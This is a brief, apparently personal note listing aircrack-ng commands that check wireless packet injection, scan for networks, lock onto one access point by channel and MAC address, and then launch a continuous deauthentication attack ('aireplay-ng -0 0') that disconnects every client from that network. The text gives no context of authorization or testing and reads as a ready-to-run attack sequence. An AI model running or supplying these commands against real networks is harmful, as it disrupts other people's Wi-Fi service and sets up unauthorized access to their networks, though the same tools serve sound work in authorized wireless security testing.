To check Packet injection is working or not 
sudo aireplay-ng --test wlan0

Then run this commands

sudo airodump-ng wlan0
sudo airodump-ng -c [Channel number] --bssid [main mac] wlan0
# Next Tab
sudo aireplay-ng -0 0 -a [main mac] wlan0
 
